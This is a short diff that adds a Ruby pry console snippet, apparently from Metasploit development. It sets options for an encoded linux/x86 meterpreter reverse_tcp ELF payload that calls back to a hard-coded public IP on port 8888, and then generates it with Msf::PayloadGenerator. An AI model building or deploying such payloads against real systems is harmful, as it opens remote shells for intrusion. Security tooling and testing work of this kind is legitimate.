@@ -1,0 +1,5 @@
+[1] pry(main)> generator_opts
+=> {:payload=>"linux/x86/meterpreter/reverse_tcp", :format=>"elf", :out=>"/root/msf.bin", :encoder=>"x86/shikata_ga_nai", :datastore=>{"LHOST"=>"162.243.136.132", "LPORT"=>"8888"}, :framework=>#<Framework (0 sessions, 0 jobs, 0 plugins)>, :cli=>true}
+
+venom_generator =  Msf::PayloadGenerator.new(generator_opts)
+payload = venom_generator.generate_payload
